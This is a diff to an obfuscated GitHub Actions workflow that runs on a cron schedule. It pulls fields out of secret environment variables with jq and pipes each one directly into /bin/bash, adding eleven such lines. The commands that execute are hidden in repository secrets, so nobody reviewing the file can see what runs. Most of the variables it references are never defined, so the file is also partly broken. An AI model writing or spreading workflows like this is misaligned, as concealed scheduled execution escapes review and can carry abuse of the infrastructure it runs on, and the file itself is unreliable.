@@ -3,7 +3,8 @@ name: wangxianglong4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 3/6 * * *'
+    - cron: '17 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,10 +13,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: wangxianglong4567
         env:
-          kva27532: ${{ secrets.kva27532 }}
+          coqn9141: ${{ secrets.coqn9141 }}
         run: |
-          echo $kva27532 | jq -r .g82 | /bin/bash
-          echo $dg0 | jq -r .tvfo55 | /bin/bash
-          echo $nq67535 | jq -r .kh01 | /bin/bash
-          echo $tnk3757 | jq -r .xrrf94851 | /bin/bash
+          echo $coqn9141 | jq -r .mwfuw0418 | /bin/bash
+          echo $gdgm5 | jq -r .isqx38 | /bin/bash
+          echo $yovw85 | jq -r .zwy7197 | /bin/bash
+          echo $nze54 | jq -r .yubsc0 | /bin/bash
+          echo $sh8 | jq -r .nb023 | /bin/bash
+          echo $mkl0059 | jq -r .vgb09498 | /bin/bash
+          echo $c27688 | jq -r .noefa81702 | /bin/bash
+          echo $d81 | jq -r .aypdm734 | /bin/bash
+          echo $dqe22 | jq -r .c36 | /bin/bash
+          echo $eb08 | jq -r .hbxl91 | /bin/bash
+          echo $adpv9670 | jq -r .mqk62 | /bin/bash
 
